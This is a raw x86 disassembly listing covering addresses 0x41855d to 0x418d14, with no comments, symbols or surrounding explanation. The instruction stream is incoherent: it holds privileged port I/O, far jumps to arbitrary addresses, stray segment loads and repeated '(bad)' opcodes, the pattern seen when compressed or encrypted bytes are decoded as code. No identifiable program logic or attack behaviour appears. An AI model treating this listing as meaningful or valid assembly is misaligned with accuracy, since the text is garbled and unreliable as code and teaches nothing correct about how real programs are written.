  41855d:	clc    
  41855e:	fwait
  41855f:	mov    al,0x1a
  418561:	gs mov esp,0xe55086f1
  418567:	and    esp,eax
  418569:	rcl    DWORD PTR [ebx-0x6a],cl
  41856c:	shl    DWORD PTR [eax],cl
  41856e:	les    ebx,FWORD PTR [ebx+0x32]
  418571:	aaa    
  418572:	mov    al,ds:0xa7146bed
  418577:	stos   DWORD PTR es:[edi],eax
  418578:	xor    edx,DWORD PTR [edx-0xf]
  41857b:	shl    DWORD PTR [eax],1
  41857d:	dec    eax
  41857e:	xchg   esp,eax
  41857f:	pop    ebp
  418580:	cld    
  418581:	dec    edx
  418582:	cs pop ds
  418584:	inc    eax
  418585:	push   cs
  418586:	cli    
  418587:	test   eax,0x588565e1
  41858c:	das    
  41858d:	inc    ebx
  41858e:	pop    eax
  41858f:	test   DWORD PTR [ebp+0xba942c1],0x1a7599e6
  418599:	ds in  eax,0x89
  41859c:	jo     0x4185b1
  41859e:	pop    ebp
  41859f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185a0:	sti    
  4185a1:	inc    ebp
  4185a2:	jl     0x4185e7
  4185a4:	adc    BYTE PTR [edi+ebx*8],bl
  4185a7:	into   
  4185a8:	pop    edi
  4185a9:	push   edi
  4185aa:	pusha  
  4185ab:	popa   
  4185ac:	std    
  4185ad:	test   BYTE PTR [ebx],dh
  4185af:	mov    eax,ds:0xe3d1b98a
  4185b4:	and    BYTE PTR [ecx-0x6b],ah
  4185b7:	ss cmp dl,bl
  4185ba:	cmp    BYTE PTR [ecx],0x29
  4185bd:	jp     0x418613
  4185bf:	mov    ch,0x2e
  4185c1:	mov    cl,0x47
  4185c3:	leave  
  4185c4:	outs   dx,DWORD PTR ds:[esi]
  4185c5:	add    DWORD PTR [edx],edx
  4185c7:	jno    0x4185c0
  4185c9:	dec    edx
  4185ca:	xchg   ecx,eax
  4185cb:	outs   dx,DWORD PTR ds:[esi]
  4185cc:	push   es
  4185cd:	pop    ebx
  4185ce:	rol    BYTE PTR [edx-0x345556c7],0x67
  4185d5:	inc    esp
  4185d6:	(bad)  
  4185d7:	push   esi
  4185d8:	aad    0x9a
  4185da:	jae    0x4185f2
  4185dc:	aad    0x5f
  4185de:	mov    ch,BYTE PTR ds:0xbb0a64e2
  4185e4:	shl    DWORD PTR [ebx-0x79be0810],1
  4185ea:	leave  
  4185eb:	jle    0x41860c
  4185ed:	pop    edx
  4185ee:	jne    0x418642
  4185f0:	test   DWORD PTR [ebx-0x7c4ed8c8],0x1ab51f4a
  4185fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185fb:	xchg   BYTE PTR [edi-0x6e],dh
  4185fe:	xchg   edx,eax
  4185ff:	lods   eax,DWORD PTR ds:[esi]
  418600:	retf   0xbad2
  418603:	jle    0x4185f9
  418605:	add    DWORD PTR [edx+0x15],edx
  418608:	lock cmp ecx,eax
  41860b:	ds addr16 cmp ecx,esi
  41860f:	adc    DWORD PTR [ebx],eax
  418611:	sbb    al,BYTE PTR [edx+0x7c0b017f]
  418617:	push   ecx
  418618:	sbb    DWORD PTR [ebp-0x3fa55ea5],ebp
  41861e:	les    edi,FWORD PTR [ecx+0x25]
  418621:	aaa    
  418622:	test   WORD PTR [edx-0x3909ad2f],bp
  418629:	bound  esp,QWORD PTR [edx-0x322306df]
  41862f:	mov    esi,0x91516be8
  418634:	xor    al,0x82
  418636:	mov    dl,0xf9
  418638:	pop    edi
  418639:	cmp    edx,DWORD PTR [eax]
  41863b:	and    eax,0xbe496ac1
  418640:	retf   
  418641:	xchg   BYTE PTR [ecx+eax*8-0x2a],bh
  418645:	inc    ebx
  418646:	test   DWORD PTR ds:0x28a24558,edx
  41864c:	mov    ebp,0x96f9b51f
  418651:	scas   al,BYTE PTR es:[edi]
  418652:	xor    eax,eax
  418654:	sbb    al,0x57
  418656:	lahf   
  418657:	loopne 0x41863e
  418659:	loopne 0x41868a
  41865b:	cmp    DWORD PTR [ecx+esi*8],edi
  41865e:	pop    ebx
  41865f:	cmp    eax,0x79639983
  418664:	cmp    BYTE PTR [esi-0x1c],bh
  418667:	push   cs
  418668:	out    dx,al
  418669:	test   BYTE PTR [ebp-0x7d],bl
  41866c:	or     BYTE PTR [edi-0x4c],al
  41866f:	add    ch,BYTE PTR [edi]
  418671:	mov    dl,0x18
  418673:	xchg   ecx,eax
  418674:	jae    0x4186ab
  418676:	xor    eax,0xa0f2ef97
  41867b:	fstp   TBYTE PTR [ebx+0x3b0a9e0b]
  418681:	inc    edx
  418682:	mov    ebp,0x7dc82177
  418687:	adc    eax,0x52133b94
  41868c:	scas   eax,DWORD PTR es:[edi]
  41868d:	ins    DWORD PTR es:[edi],dx
  41868e:	fnstcw WORD PTR ds:0x2e7aad9a
  418694:	out    dx,eax
  418695:	inc    edi
  418696:	test   BYTE PTR [edx],cl
  418698:	loopne 0x4186c6
  41869a:	xlat   BYTE PTR ds:[ebx]
  41869b:	and    dh,BYTE PTR [esi-0x5d]
  41869e:	mov    cl,dh
  4186a0:	das    
  4186a1:	adc    DWORD PTR ds:0x46815f1d,esi
  4186a7:	popf   
  4186a8:	add    al,0x1a
  4186aa:	add    bh,dh
  4186ac:	out    dx,eax
  4186ad:	adc    ecx,DWORD PTR ds:0xb5c6ae9e
  4186b3:	sti    
  4186b4:	enter  0xd941,0x32
  4186b8:	or     DWORD PTR ss:[ebx-0xc7e8ce3],esi
  4186bf:	jg     0x418699
  4186c1:	xor    edx,DWORD PTR [ecx]
  4186c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186c4:	mov    bh,0x92
  4186c6:	ret    
  4186c7:	cli    
  4186c8:	cld    
  4186c9:	cli    
  4186ca:	cwde   
  4186cb:	xor    esi,DWORD PTR [esi-0x6d]
  4186ce:	out    0x1c,al
  4186d0:	rcr    BYTE PTR [ecx+0x4b1d27be],0x6d
  4186d7:	scas   al,BYTE PTR es:[edi]
  4186d8:	iret   
  4186d9:	pop    esi
  4186da:	pop    ebp
  4186db:	test   eax,0x9eb0fad0
  4186e0:	mov    ds:0x435432c0,eax
  4186e5:	cmp    eax,0x86297cf8
  4186ea:	ins    BYTE PTR es:[edi],dx
  4186eb:	dec    ebx
  4186ec:	ror    esp,0x98
  4186ef:	push   ss
  4186f0:	leave  
  4186f1:	outs   dx,BYTE PTR ds:[esi]
  4186f2:	imul   edx,DWORD PTR [edx+0x7296f38b],0xf34f8cda
  4186fc:	je     0x418735
  4186fe:	out    dx,eax
  4186ff:	fisub  DWORD PTR [ebp+ebp*1+0x3a3861ac]
  418706:	daa    
  418707:	scas   eax,DWORD PTR es:[edi]
  418708:	ret    0xa2d0
  41870b:	inc    bh
  41870d:	xor    dl,BYTE PTR [esi+0x1a914ae6]
  418713:	ins    DWORD PTR es:[edi],dx
  418714:	popf   
  418715:	xor    ecx,esp
  418717:	mov    edx,0xfd81ad06
  41871c:	sbb    al,0x84
  41871e:	inc    esp
  41871f:	and    DWORD PTR [eax-0x4d],ecx
  418722:	inc    ecx
  418723:	shl    DWORD PTR [ecx],0x4a
  418726:	xchg   cl,dh
  418728:	stos   DWORD PTR es:[edi],eax
  418729:	adc    al,0x59
  41872b:	jne    0x4186c8
  41872d:	adc    DWORD PTR [ebx-0x18c22676],edx
  418733:	fwait
  418734:	pop    ds
  418735:	sbb    eax,0x5a228048
  41873a:	or     DWORD PTR [ecx-0x5b2d7c6f],0x5f
  418741:	mov    ebx,0x71d76fd3
  418746:	and    edx,DWORD PTR [esp+edi*8-0x7d]
  41874a:	xor    dl,bl
  41874c:	in     eax,dx
  41874d:	jecxz  0x41878b
  41874f:	inc    esi
  418750:	stos   BYTE PTR es:[edi],al
  418751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418752:	repz cmp eax,0x3e19c463
  418758:	push   edx
  418759:	rol    DWORD PTR [ebp+esi*1+0x38],cl
  41875d:	cmp    DWORD PTR [ebx-0x4ebc1e9],esp
  418763:	mov    ?,WORD PTR [ebp-0x4ca55cfa]
  418769:	lea    edx,[ecx]
  41876b:	mov    ebp,0xedf4f831
  418770:	add    cl,bl
  418772:	and    eax,0x6b6de0fd
  418777:	mov    ch,0x67
  418779:	outs   dx,BYTE PTR ds:[esi]
  41877a:	imul   eax,DWORD PTR [ecx+0x6fe01767],0xffffffe8
  418781:	xchg   ebx,eax
  418782:	jecxz  0x4187c5
  418784:	push   esp
  418785:	pop    ds
  418786:	out    dx,eax
  418787:	push   0x5885548a
  41878c:	add    cl,ch
  41878e:	xor    BYTE PTR [esi+0x70123343],ah
  418794:	dec    eax
  418795:	mov    edx,edx
  418797:	fnstcw WORD PTR [ecx+0x67d3da3f]
  41879d:	add    bh,ch
  41879f:	repz repz aaa 
  4187a2:	jns    0x418792
  4187a4:	xchg   DWORD PTR [ebx-0x44],ebx
  4187a7:	cs out dx,al
  4187a9:	xchg   edi,eax
  4187aa:	add    BYTE PTR [esi],0x7f
  4187ad:	fldenv [esi-0x34]
  4187b0:	and    ch,BYTE PTR [edx]
  4187b2:	test   eax,0x79b4fef1
  4187b7:	in     al,0x69
  4187b9:	xor    eax,0x2a7e633
  4187be:	jmp    0x3c56ee67
  4187c3:	popa   
  4187c4:	sub    al,0x16
  4187c6:	pop    ebx
  4187c7:	mov    ebx,0xc9bbfc62
  4187cc:	add    ebp,DWORD PTR [ebx-0x127c31d9]
  4187d2:	jp     0x418831
  4187d4:	loop   0x4187e8
  4187d6:	shl    BYTE PTR [ebx-0x14],1
  4187d9:	inc    edi
  4187da:	nop
  4187db:	dec    esi
  4187dc:	push   ds
  4187dd:	push   edi
  4187de:	add    DWORD PTR [ebp-0x3530666e],edi
  4187e4:	hlt    
  4187e5:	mov    edi,0x2e122d66
  4187ea:	pop    edx
  4187eb:	mov    ebx,0xd31aac39
  4187f0:	out    dx,al
  4187f1:	fucomi st,st(3)
  4187f3:	push   cs
  4187f4:	je     0x4187a4
  4187f6:	sub    BYTE PTR [edi-0x4c5cc306],cl
  4187fc:	cmp    eax,0xa4ceebd1
  418801:	jmp    0x4187ab
  418803:	stos   DWORD PTR es:[edi],eax
  418804:	cs icebp 
  418806:	mov    ecx,0x7d016abe
  41880b:	inc    ebx
  41880c:	dec    edx
  41880d:	add    eax,0x7cec6149
  418812:	das    
  418813:	pop    edx
  418814:	mov    ds:0xb91ba80c,al
  418819:	ja     0x4187a2
  41881b:	pop    ebx
  41881c:	fdivrp st(5),st
  41881e:	or     al,0xf6
  418820:	imul   ebx,DWORD PTR [edi-0xcf275fc],0x79
  418827:	rol    dl,1
  418829:	aad    0x82
  41882b:	les    ebp,FWORD PTR [esi-0x634a09ed]
  418831:	push   es
  418832:	pop    ds
  418833:	idiv   DWORD PTR [edi+0x66]
  418836:	aad    0x87
  418838:	test   eax,0x6828ced5
  41883d:	lock cmp al,0x87
  418840:	out    0x99,al
  418842:	daa    
  418843:	mov    ch,0x25
  418845:	adc    DWORD PTR [ecx+0x57],edi
  418848:	add    al,0xcb
  41884a:	or     bl,BYTE PTR [edx-0x426f43f4]
  418850:	push   edx
  418851:	lods   eax,DWORD PTR ds:[esi]
  418852:	xchg   DWORD PTR [ebx],edi
  418854:	enter  0xd803,0x56
  418858:	jmp    0x952435b0
  41885d:	push   edx
  41885e:	sub    eax,0xac52f87d
  418863:	nop
  418864:	shl    BYTE PTR [edi],1
  418866:	jmp    0x4b87c62
  41886b:	scas   al,BYTE PTR es:[edi]
  41886c:	jno    0x418881
  41886e:	pop    ebp
  41886f:	sub    DWORD PTR [ecx+0x31ffb4f],0xe7083812
  418879:	fcmovnu st,st(7)
  41887b:	in     eax,dx
  41887c:	xor    ch,0x8a
  41887f:	std    
  418880:	stos   DWORD PTR es:[edi],eax
  418881:	dec    ebx
  418882:	add    eax,0x497c7460
  418887:	jno    0x41884f
  418889:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41888a:	mov    ah,0x1c
  41888c:	int3   
  41888d:	pop    ebx
  41888e:	dec    ebp
  41888f:	push   cs
  418890:	sysenter 
  418892:	pop    eax
  418893:	loope  0x4188de
  418895:	add    BYTE PTR [edx-0x73],ch
  418898:	mov    ch,0x6a
  41889a:	add    DWORD PTR [edx-0x69],esi
  41889d:	retf   0x8ec8
  4188a0:	fucomi st,st(3)
  4188a2:	pop    edi
  4188a3:	fisubr WORD PTR [edx-0x2425cda7]
  4188a9:	push   ecx
  4188aa:	imul   edx,DWORD PTR [esi+0x5ff17c77],0xfffffff2
  4188b1:	dec    ecx
  4188b2:	arpl   WORD PTR [edx+0x1f],di
  4188b5:	sbb    al,0x21
  4188b7:	mov    esp,0x92b11d27
  4188bc:	sar    cl,1
  4188be:	push   es
  4188bf:	mov    DWORD PTR [edi-0x59],edi
  4188c2:	(bad)  
  4188c3:	fidiv  DWORD PTR ds:0x78aa9557
  4188c9:	in     eax,dx
  4188ca:	mov    al,0x5a
  4188cc:	xchg   ecx,eax
  4188cd:	aaa    
  4188ce:	mov    ds:0xbab719a5,al
  4188d3:	mov    esp,DWORD PTR [edi-0x34]
  4188d6:	retf   0xe1ec
  4188d9:	cmp    DWORD PTR [edx+0x1116529e],edx
  4188df:	(bad)  
  4188e1:	stos   BYTE PTR es:[edi],al
  4188e2:	stos   BYTE PTR es:[edi],al
  4188e3:	xchg   al,ch
  4188e5:	mov    DWORD PTR [ecx-0x3bfacb56],ebx
  4188eb:	jmp    0xb5ee:0xbe0ea3fb
  4188f2:	shl    cl,0x54
  4188f5:	add    al,0x17
  4188f7:	and    al,0xba
  4188fa:	mov    al,0xbf
  4188fc:	adc    bh,BYTE PTR [eiz*2+0x5072ea32]
  418903:	scas   eax,DWORD PTR es:[edi]
  418904:	daa    
  418905:	ret    0x1ca2
  418908:	mov    eax,ds:0xf8e230b4
  41890d:	and    bh,BYTE PTR [ecx-0x4]
  418910:	lods   eax,DWORD PTR ds:[esi]
  418911:	mov    DWORD PTR [ecx],esi
  418913:	jmp    0x41890a
  418915:	popa   
  418916:	imul   ebp,edi,0xa700fe3b
  41891c:	pop    ds
  41891d:	sub    ebx,DWORD PTR [edx-0xf533620]
  418923:	jno    0x41894d
  418925:	and    edx,DWORD PTR [ecx+ecx*4-0x6c54d8b7]
  41892c:	xchg   ecx,eax
  41892d:	push   0xf5c7a1a9
  418932:	xor    DWORD PTR [edx-0x55],esp
  418935:	loopne 0x41892d
  418937:	sub    eax,0x351c3639
  41893c:	adc    esp,ecx
  41893e:	ret    0x44e8
  418941:	lds    cx,DWORD PTR [eax+0x34]
  418945:	xchg   ebp,eax
  418946:	sbb    edi,DWORD PTR [ebx+0x6e7a9467]
  41894c:	fsubr  DWORD PTR [edi]
  41894e:	mov    ebp,0xf0ffeced
  418953:	hlt    
  418954:	ror    BYTE PTR [eax],1
  418956:	scas   al,BYTE PTR es:[edi]
  418957:	mov    gs,WORD PTR [esi]
  418959:	aad    0xf8
  41895b:	lea    ecx,ds:0x189d9c62
  418961:	ret    
  418962:	je     0x418925
  418964:	mov    ds:0xa667023d,eax
  418969:	sti    
  41896a:	xor    ebx,DWORD PTR [ebp+0x73]
  41896d:	mov    ch,0xae
  41896f:	lea    ecx,[edx-0x5799d489]
  418975:	cmp    DWORD PTR [ebx],0xffffffbf
  418978:	push   edx
  418979:	jle    0x418962
  41897b:	xor    bh,BYTE PTR [ebp+0x1df57c23]
  418981:	dec    ecx
  418982:	loop   0x4189e8
  418984:	repz out 0x85,al
  418987:	cmp    dl,ah
  418989:	and    BYTE PTR [eax+0x17],al
  41898c:	xor    ebx,edx
  41898e:	mov    edi,0xb2050b8f
  418993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418994:	pop    ebx
  418995:	dec    edx
  418996:	jo     0x4189c1
  418998:	test   BYTE PTR [eax+ecx*2],dh
  41899b:	je     0x418955
  41899d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41899e:	and    DWORD PTR [ecx+edx*8+0x6a],edi
  4189a2:	arpl   WORD PTR [ecx-0x262dd902],sp
  4189a8:	push   ds
  4189a9:	pop    esi
  4189aa:	and    eax,0x5620c2a4
  4189af:	(bad)  
  4189b0:	mov    dl,0x93
  4189b2:	xor    eax,ecx
  4189b4:	in     al,dx
  4189b5:	mov    dl,0xba
  4189b7:	jbe    0x41894f
  4189b9:	fdivr  st,st(4)
  4189bb:	stos   BYTE PTR es:[edi],al
  4189bc:	mov    dh,0x87
  4189be:	rcl    BYTE PTR [ecx-0x5a],cl
  4189c1:	clc    
  4189c2:	das    
  4189c3:	test   al,0xb0
  4189c5:	pop    ds
  4189c6:	mov    ds:0xd40c0eb7,al
  4189cb:	add    bh,BYTE PTR [esi+0x22]
  4189ce:	fnstsw WORD PTR [esi-0x10582940]
  4189d4:	retf   0x621a
  4189d7:	jmp    0x4c7b:0x33f4b775
  4189de:	loopne 0x4189e6
  4189e0:	and    ch,ch
  4189e2:	daa    
  4189e3:	fsubr  st,st(2)
  4189e5:	sbb    eax,ebx
  4189e7:	or     ebx,eax
  4189e9:	jb     0x4189e2
  4189eb:	cli    
  4189ec:	mov    dh,BYTE PTR [edi]
  4189ee:	dec    eax
  4189ef:	jmp    0xb78d3682
  4189f4:	aaa    
  4189f5:	inc    ebx
  4189f6:	bound  esi,QWORD PTR [esi]
  4189f8:	loope  0x418a39
  4189fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189fb:	ret    0x4aec
  4189fe:	fwait
  4189ff:	xor    eax,0x67269b36
  418a04:	sbb    ch,0xca
  418a07:	mov    esi,0x432ab9a1
  418a0c:	jmp    0x4189a4
  418a0e:	mov    ds:0x2b7cc081,al
  418a13:	and    bh,cl
  418a15:	in     al,0x15
  418a17:	adc    al,0x70
  418a19:	jmp    0x418a23
  418a1b:	inc    edx
  418a1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a1d:	pop    esp
  418a1e:	cmp    dh,BYTE PTR [edi-0x4dd7dfcb]
  418a24:	mov    eax,0xf13fd89f
  418a29:	adc    DWORD PTR [eax-0xe],0x35
  418a2d:	bnd jle 0x4189cc
  418a30:	push   ebp
  418a31:	add    DWORD PTR ds:[ecx+0x39],0xefbd9a80
  418a39:	daa    
  418a3a:	addr16 mov dh,0xeb
  418a3d:	add    DWORD PTR [ecx],edx
  418a3f:	sub    bh,BYTE PTR [ebp+ebp*8+0x5a42726b]
  418a46:	push   cs
  418a47:	xchg   esi,eax
  418a48:	mov    dl,0x21
  418a4a:	seta   al
  418a4d:	sbb    ebx,DWORD PTR [edx-0x72]
  418a50:	les    edi,FWORD PTR [ebx+0xffbfd0d]
  418a56:	les    ecx,FWORD PTR [edi-0x6bdfb68]
  418a5c:	gs jmp 0x418a39
  418a5f:	test   DWORD PTR [esi],ebx
  418a61:	shr    ebx,cl
  418a63:	out    dx,eax
  418a64:	aad    0x32
  418a66:	sar    DWORD PTR [eax-0x5a],cl
  418a69:	jle    0x418a9c
  418a6b:	and    BYTE PTR [esi],bl
  418a6d:	(bad)  
  418a6e:	aad    0xc
  418a70:	in     eax,0xf
  418a72:	jbe    0x418a51
  418a74:	xor    DWORD PTR [ecx-0x33],edx
  418a77:	es jle 0x418a8e
  418a7a:	in     al,dx
  418a7b:	imul   esi,DWORD PTR [ebx],0xffffffc1
  418a7e:	mov    edx,ss
  418a80:	push   ebp
  418a81:	or     edi,DWORD PTR [ecx]
  418a83:	jo     0x418a25
  418a85:	mov    eax,ds:0x79dc2aa5
  418a8a:	xor    al,BYTE PTR [ecx-0x2e]
  418a8d:	fcmovnbe st,st(1)
  418a8f:	test   BYTE PTR [eax-0x34e9ffc5],0x1b
  418a96:	fbstp  TBYTE PTR ds:0xea43ee1e
  418a9c:	inc    edi
  418a9d:	aas    
  418a9e:	push   esi
  418a9f:	pop    ecx
  418aa0:	push   edx
  418aa1:	jge    0x418aa3
  418aa3:	cwde   
  418aa4:	jg     0x418a28
  418aa6:	nop
  418aa7:	push   0x42
  418aa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418aaa:	inc    edx
  418aab:	push   ebp
  418aac:	jge    0x418abd
  418aae:	mov    BYTE PTR [eax],ah
  418ab0:	push   es
  418ab1:	add    BYTE PTR [edi+0x7feb73d2],ch
  418ab7:	jmp    0x760c51a7
  418abc:	fiadd  WORD PTR [ecx-0x723dfe50]
  418ac2:	punpckhdq mm7,QWORD PTR [edi+0x1b]
  418ac6:	dec    ebx
  418ac7:	sti    
  418ac8:	push   ds
  418ac9:	in     eax,0x50
  418acb:	aad    0x7f
  418acd:	fisubr DWORD PTR [ebp+0x1d]
  418ad0:	leave  
  418ad1:	and    DWORD PTR [ebx],eax
  418ad3:	imul   esi,DWORD PTR [eax+eax*1-0x3d0cde77],0xffffffa0
  418adb:	push   0xb710e807
  418ae0:	stos   DWORD PTR es:[edi],eax
  418ae1:	pop    ss
  418ae2:	add    ah,BYTE PTR [edx]
  418ae4:	sub    ebp,DWORD PTR [edi+0x61]
  418ae7:	sub    ch,dh
  418ae9:	cwde   
  418aea:	inc    ebx
  418aeb:	push   ecx
  418aec:	mov    eax,0xc08c4e05
  418af1:	aad    0x2
  418af3:	push   ebp
  418af4:	adc    dl,cl
  418af6:	sti    
  418af7:	pop    ebx
  418af8:	retf   0xd5b3
  418afb:	jne    0x418afd
  418afd:	push   eax
  418afe:	in     al,dx
  418aff:	mov    esi,0xa2190149
  418b04:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  418b06:	mov    ebp,0xa30927aa
  418b0b:	loop   0x418a97
  418b0d:	xchg   esp,eax
  418b0e:	pop    ecx
  418b0f:	push   cs
  418b10:	mov    DWORD PTR cs:[ebx+0x69],ebp
  418b14:	cmp    esp,DWORD PTR [ebx-0x62d1f47e]
  418b1a:	repnz mov eax,ds:0xc8f3a19c
  418b20:	jecxz  0x418b56
  418b22:	pop    esp
  418b23:	dec    edx
  418b24:	into   
  418b25:	inc    esp
  418b26:	ror    DWORD PTR [eax+0x76],cl
  418b29:	push   es
  418b2a:	cmp    esp,DWORD PTR [eax+edx*1-0x246d3624]
  418b31:	xchg   DWORD PTR [edx+0x11],esp
  418b34:	popf   
  418b35:	ins    DWORD PTR es:[edi],dx
  418b36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b37:	inc    ebp
  418b38:	xor    al,BYTE PTR [ebp+0x3]
  418b3b:	int    0xfc
  418b3d:	ins    BYTE PTR es:[edi],dx
  418b3e:	pop    ecx
  418b3f:	iret   
  418b40:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b42:	adc    DWORD PTR [ebx+0x2a53f9ad],edx
  418b48:	hlt    
  418b49:	add    eax,0xf58afb3a
  418b4e:	xor    eax,0x271cece7
  418b53:	mov    ebx,0x1cf51a8f
  418b58:	pusha  
  418b59:	xor    eax,0xfecaa967
  418b5e:	hlt    
  418b5f:	xchg   esi,eax
  418b60:	ins    DWORD PTR es:[edi],dx
  418b61:	in     al,0xc3
  418b63:	dec    edx
  418b64:	imul   ecx,esi,0x75b846a2
  418b6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b6b:	clc    
  418b6c:	mov    ah,0xa1
  418b6e:	pop    eax
  418b6f:	mov    ah,0x12
  418b71:	scas   al,BYTE PTR es:[edi]
  418b72:	enter  0x83e4,0xe7
  418b76:	mov    ds:0x3bdbb781,al
  418b7b:	jg     0x418bf5
  418b7d:	pusha  
  418b7e:	sar    DWORD PTR [edx+0x24],0x13
  418b82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b83:	cmp    eax,0xf7a2fcc1
  418b88:	mov    ah,0x3b
  418b8a:	xor    al,0x88
  418b8c:	jecxz  0x418b11
  418b8e:	mov    ch,0xf1
  418b90:	aam    0xc6
  418b92:	das    
  418b93:	cli    
  418b94:	leave  
  418b95:	inc    ecx
  418b96:	(bad)
  418b99:	and    eax,0x3c88fdf0
  418b9e:	pop    edx
  418b9f:	push   0x650ab940
  418ba4:	lahf   
  418ba5:	mov    DWORD PTR [edx+0x3a599990],0xa5333349
  418baf:	xchg   DWORD PTR [edx+eiz*8+0x21],ebp
  418bb3:	or     eax,0xd4fe1abd
  418bb8:	jno    0x418b7f
  418bba:	loopne 0x418bb6
  418bbc:	bound  edx,QWORD PTR [esi+ebp*8+0x2ad0fab1]
  418bc3:	pop    esp
  418bc4:	out    0xc2,eax
  418bc6:	jno    0x418bc8
  418bc8:	dec    esi
  418bc9:	mov    eax,ds:0xd7c82d04
  418bce:	fsubp  st(3),st
  418bd0:	test   eax,0x3f02ddd3
  418bd5:	sbb    ch,BYTE PTR [edx]
  418bd7:	fwait
  418bd8:	cmp    BYTE PTR [edi+0x6d],bl
  418bdb:	clc    
  418bdc:	push   edi
  418bdd:	nop
  418bde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bdf:	stos   BYTE PTR es:[edi],al
  418be0:	test   DWORD PTR [esi],eax
  418be2:	xchg   esp,eax
  418be3:	(bad)  
  418be4:	scas   al,BYTE PTR es:[edi]
  418be5:	mov    ecx,esi
  418be7:	(bad)  
  418be8:	cmp    eax,0x32ef249e
  418bed:	push   edi
  418bee:	jne    0x418c6a
  418bf0:	repnz cmp dl,bl
  418bf3:	inc    edi
  418bf4:	retf   
  418bf5:	and    eax,0xbfba6dbc
  418bfa:	push   ebx
  418bfb:	mov    bl,0xc
  418bfd:	jns    0x418bb9
  418bff:	pop    ecx
  418c00:	dec    edx
  418c01:	lahf   
  418c02:	fs mov bh,0xfe
  418c05:	push   ebp
  418c06:	rcl    DWORD PTR [edi+ebp*8+0x6acd6197],0x2d
  418c0e:	mov    ds:0x50f912a1,eax
  418c13:	fist   DWORD PTR [eax-0x41d072ce]
  418c19:	add    bl,BYTE PTR [ebp+0x28d104de]
  418c1f:	mov    esp,0x3f02b495
  418c24:	mov    dl,0x4b
  418c26:	mov    WORD PTR [edx],ss
  418c28:	push   ecx
  418c29:	inc    esi
  418c2a:	scas   al,BYTE PTR es:[edi]
  418c2b:	inc    esi
  418c2c:	std    
  418c2d:	dec    esp
  418c2e:	out    0x58,eax
  418c30:	out    0x80,eax
  418c32:	fistp  DWORD PTR [ecx]
  418c34:	sub    eax,0x1cba8666
  418c39:	xchg   DWORD PTR [edi],ecx
  418c3b:	std    
  418c3c:	xor    edi,ebx
  418c3e:	cmp    dl,bl
  418c40:	imul   esp,DWORD PTR ds:[edi],0xffffffdd
  418c44:	add    esi,DWORD PTR [eax]
  418c46:	sub    cl,BYTE PTR [eax-0xe]
  418c49:	jae    0x418c70
  418c4b:	test   eax,0x7c80fb17
  418c50:	jecxz  0x418c08
  418c52:	clc    
  418c53:	fstp   st(5)
  418c55:	jns    0x418bea
  418c57:	sub    ebp,edi
  418c59:	lea    ebp,[ebx+0x19]
  418c5c:	sahf   
  418c5d:	lahf   
  418c5e:	test   al,0xa4
  418c60:	rol    BYTE PTR [ebx+0x41a1fa61],cl
  418c66:	sub    al,BYTE PTR [edi]
  418c68:	ret    0x2e8b
  418c6b:	je     0x418c94
  418c6d:	dec    edi
  418c6e:	sub    bh,BYTE PTR [ebx]
  418c70:	mov    edx,DWORD PTR [ebx+0x752bfb2c]
  418c76:	sub    ch,BYTE PTR [edi]
  418c78:	pop    edi
  418c79:	adc    al,0x28
  418c7b:	mov    ds:0xb9483301,al
  418c80:	inc    edx
  418c81:	and    dh,dl
  418c83:	ins    DWORD PTR es:[edi],dx
  418c84:	cmc    
  418c85:	xor    ch,BYTE PTR [esi+0x746dc8a8]
  418c8b:	es enter 0x44d2,0xfb
  418c90:	addr16 jno 0x418c59
  418c93:	cli    
  418c94:	mov    eax,ds:0xddd8056c
  418c99:	jo     0x418c4d
  418c9b:	fs mov ah,0x3
  418c9e:	dec    edi
  418c9f:	rcl    DWORD PTR [esi-0x4c],cl
  418ca2:	fwait
  418ca3:	lock fs sti 
  418ca6:	out    dx,al
  418ca7:	out    dx,al
  418ca8:	fiadd  DWORD PTR [edx+0x73]
  418cab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cac:	pushf  
  418cad:	ror    BYTE PTR [ebp+0x24],0x8e
  418cb1:	cmc    
  418cb2:	fldcw  WORD PTR [edx+esi*2+0x29]
  418cb6:	or     dl,BYTE PTR gs:[eax]
  418cb9:	mov    ebx,0x4df0bf5c
  418cbe:	adc    cl,BYTE PTR [ebx+0x14]
  418cc1:	or     al,0x8d
  418cc3:	je     0x418c84
  418cc5:	dec    esp
  418cc6:	(bad)  
  418cc8:	ins    DWORD PTR es:[edi],dx
  418cc9:	jmp    0x418c73
  418ccb:	neg    BYTE PTR [esi+0x5]
  418cce:	push   ecx
  418ccf:	cld    
  418cd0:	lds    ebp,FWORD PTR [eax-0x2dffe6cc]
  418cd6:	sar    dh,0x73
  418cd9:	and    al,0x47
  418cdb:	(bad)  
  418cdc:	lods   al,BYTE PTR ds:[esi]
  418cdd:	cwde   
  418cde:	add    ebx,DWORD PTR ds:0x365ebb71
  418ce4:	mov    ebx,DWORD PTR [esi-0x5b1d1bb2]
  418cea:	in     eax,dx
  418ceb:	in     eax,0xb6
  418ced:	sbb    cl,cl
  418cef:	inc    esi
  418cf0:	mov    esp,0x7ae8d4f0
  418cf5:	inc    ebp
  418cf6:	mov    edx,0x7ebd3e80
  418cfb:	pop    ds
  418cfc:	scas   eax,DWORD PTR es:[edi]
  418cfd:	dec    ebp
  418cfe:	test   eax,0xe3304302
  418d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d04:	pushf  
  418d05:	sub    ebp,0x2c
  418d08:	mov    edx,0xc75aba7a
  418d0d:	cmp    eax,0x4c6c127e
  418d12:	mov    edx,ebx
  418d14:	xchg   esi,eax
